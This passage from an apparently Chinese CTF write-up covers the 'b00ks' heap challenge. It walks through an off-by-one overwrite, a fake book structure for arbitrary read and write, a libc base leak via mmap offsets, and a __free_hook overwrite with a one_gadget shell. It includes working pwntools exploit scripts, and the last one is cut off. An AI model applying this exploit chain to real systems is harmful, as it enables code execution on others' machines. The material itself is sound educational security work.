offset unk_202060    ; DATA XREF: check_space:loc_B38↑o</span><br><span class="line">.data:0000000000202010                                         ; delete_book:loc_C1B↑o ...</span><br><span class="line">.data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: edit_author_name+<span class="number">15</span>↑o</span><br><span class="line">.data:0000000000202018                                         ; list_book+CA↑o</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=<span class="number">0x555555603010</span>, size=<span class="number">0x290</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x0000555555603010</span>     <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    ................]</span><br><span class="line">Chunk(addr=<span class="number">0x5555556032a0</span>, size=<span class="number">0x410</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x00005555556032a0</span>     <span class="number">33</span> <span class="number">32</span> 0a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="number">32.</span>.............]</span><br><span class="line">Chunk(addr=<span class="number">0x5555556036b0</span>, size=<span class="number">0x30</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x00005555556036b0</span>     <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    aaaaaaaaaa......]</span><br><span class="line">Chunk(addr=<span class="number">0x5555556036e0</span>, size=<span class="number">0x30</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x00005555556036e0</span>     <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    bbbbbbbbbb......]</span><br><span class="line">Chunk(addr=<span class="number">0x555555603710</span>, size=<span class="number">0x30</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x0000555555603710</span>     01 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> b0 <span class="number">36</span> <span class="number">60</span> <span class="number">55</span> <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>    ........<span class="number">.6</span>`UUU..]</span><br><span class="line">Chunk(addr=<span class="number">0x555555603740</span>, size=<span class="number">0x208d0</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk</span><br><span class="line">gef➤  x /1xg <span class="number">0x555555602010</span></span><br><span class="line"><span class="number">0x555555602010</span>:        <span class="number">0x0000555555602060</span></span><br><span class="line">gef➤  x /2xg <span class="number">0x0000555555602060</span></span><br><span class="line"><span class="number">0x555555602060</span>:        <span class="number">0x0000555555603710</span>        <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p><img src="image26.png" alt=""></p><p>可以利用off-by-one把bookshelf的第一个指针最后一位覆盖为\x00。</p><p>如果我们可以把bookshelf抬高到上面description的位置，那么我们就可以提前在descripton里面伪造好book结构体的数据。</p><ul><li>然后触发edit book的时候，就可以把我们想修改的内存地址传入进去（fake book的name和description指针指向我们修改的地址）进而达到任意地址写的目的。</li><li>然后触发list book的时候，就可以把我们想修改的内存地址传入进去（fake book的name和description指针指向我们修改的地址）进而达到任意地址读的目的。</li></ul><p>这里需要倒推一下，不考虑地址随机化(ASLR)的话，malloc第一个book的name时，堆顶是0x5555556036b0 - 0x8（从prev_size开始算）</p><p><img src="image27.png" alt=""></p><p>不考虑ASLR如果name malloc 64字节，desc malloc 32字节。那么实际上book ptr的地址会是</p><p>0x5555556036b0 - 0x10 + request2size(64) + request2size(32) + 0x10</p><p>= 0x5555556036b0 - 0x10 + request2size(64) + request2size(32) + 0x10</p><p>= 0x5555556036b0 + 0x50 + 0x30 = 0x555555603730</p><p>0x555555603730置0成0x555555603700刚好就是book1 description的地址。</p><p>更通行通法的来讲，应该再下面这个约束里面找一个解就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + request2size(Y) + <span class="number">0x10</span></span><br><span class="line">(addr &amp; ~(<span class="number">0x100</span> - <span class="number">0x1</span>)) == <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + <span class="number">0x10</span></span><br><span class="line">request2size(Y) &gt;= size(book) </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SIZE_SZ = <span class="number">8</span>  <span class="comment"># 64位系统上 size_t 的大小  </span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">15</span>  <span class="comment"># 16字节对齐掩码 (0xF)  </span></span><br><span class="line">MINSIZE = <span class="number">32</span>  <span class="comment"># 假设的最小块大小  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request2size</span>(<span class="params">req</span>):  </span><br><span class="line">    <span class="keyword">if</span> req + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE:  </span><br><span class="line">        <span class="keyword">return</span> MINSIZE  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> (req + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> X <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">65</span>):</span><br><span class="line">    <span class="keyword">for</span> Y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">65</span>):</span><br><span class="line">        addr = <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + request2size(Y) + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( (addr &amp; ~(<span class="number">0x100</span> - <span class="number">0x1</span>)) == <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + <span class="number">0x10</span> <span class="keyword">and</span> request2size(Y) &gt;= <span class="number">28</span>):</span><br><span class="line">            <span class="built_in">print</span>(X, Y)</span><br></pre></td></tr></table></figure><p>可以跑出来很多结果，我们随便挑一对验证。比如（57, 10）-&gt; 其实在后面还会发现第二个为了放payload还是需要更长一点。</p><p><img src="image28.png" alt=""></p><p>0x555555603720 -&gt; addr=0x555555603700回到description</p><p>PS: 看起来这个题目我目前只malloc了小内存块不超过0x1000所以没有跨内存页的问题，如果heap地址在ASLR的情况下其实地址按0x1000对齐也不影响？</p><p>现在已经知道可以读写任意地址了，但是这个题开了ASLR仍然不是知道libc的基地址。在PWN里面知道基地址是非常核心的一步，因为后面无论是覆盖free_hook或者别的地址，又或是找<a href="https://blog.csdn.net/weixin_62675330/article/details/123274386">onegadget</a>都需要它。</p><p>这里泄漏的基地址方法是在book中使用非常大的size迫使malloc使用mmap来分配内存， <strong>mmap分配的内存和libc基地址有一个固定偏移</strong> 。我们只需要在book1中description字段构造一个fake book让他指向book2的description或者name之一就能再调用list book就能泄漏mmap地址进而通过固定地址偏移计算出libc地址。</p><p>至于为什么有这个所谓的“固定偏移”，我看网上的wp都是一笔带过（no offence）。</p><p><img src="image29.png" alt=""></p><p><img src="image30.png" alt=""></p><p>翻了一点kernel源码看，基本搞懂了原理，写在下面<strong>附 固定地址原理</strong></p><p><img src="image31.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&#x27;/home/parallels/Desktop/b00ks&#x27;</span>  </span><br><span class="line">io = process(binary_path)</span><br><span class="line">pwnlib.gdb.attach(proc.pidof(io)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add book 1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The first idx in bookshelf: &quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_book_data = p64(<span class="number">0x1</span>) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> ) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">io.sendline(fake_book_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off-by-one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#add book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Name: &#x27;)</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Description: &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">name_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">name_mmap_addr = name_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br></pre></td></tr></table></figure><p><img src="image32.png" alt=""></p><p>这里还有一个小困惑，为什么libc-2.31.so被加载进来了这多次。</p><p><img src="image33.png" alt=""></p><p><img src="image34.png" alt=""></p><p>在本地调试的时候发现，chunk地址是0x00007fdcf6db5010，0x00007fdcf6d94010。我们就用第二个来算吧，libc相对description的固定偏移是0x7fdcf6dd6000 - 0x00007fdcf6d94010 = 0x41ff0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(u64(desc_mmap_addr)) + <span class="number">0x41ff0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc addr : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>验证一下是对的</p><p><img src="image35.png" alt=""></p><h2 id="细说利用-onegadget-getshell">细说利用 (onegadget getshell)</h2><p>Libc base已经泄露了，下一步就是edit fake book1中指向book2的desc的地方改成free_hook地址，这样在edit book2的时候就可以覆盖free hook地址的内容为one gadget地址。然后在delete book的时候就会触发free hook的one gadget获取到shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">parallels@parallels-Parallels-Virtual-Platform:~/Desktop$ one_gadget -f /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line"><span class="number">0xe3afe</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 <span class="keyword">is</span> a valid argv</span><br><span class="line">  [r12] == NULL || r12 == NULL || r12 <span class="keyword">is</span> a valid envp</span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b01</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 <span class="keyword">is</span> a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx <span class="keyword">is</span> a valid envp</span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b04</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL || rsi <span class="keyword">is</span> a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx <span class="keyword">is</span> a valid envp</span><br></pre></td></tr></table></figure><p>这种覆盖hook类方法的原理是在进入free之前会先看是否有自定义的free_hook函数如果有的话，就会直接用这个free hook而不会进入libc标准的free流程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = ELF(<span class="string">&#x27;b00ks&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&#x27;/home/parallels/Desktop/b00ks&#x27;</span>  </span><br><span class="line">io = process(binary_path)</span><br><span class="line">pwnlib.gdb.attach(proc.pidof(io)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#把author覆盖满</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add book 1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The first idx in bookshelf: &quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造一个堆块，使他指向book2的堆块， book1_addr + 0x30，因为这个chunk在用所以0x30直接包含了prev_size的字段</span></span><br><span class="line">fake_book_data = p64(<span class="number">0x1</span>) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">0x8</span> ) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">0x8</span> + <span class="number">0x8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">io.sendline(fake_book_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off-by-one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author 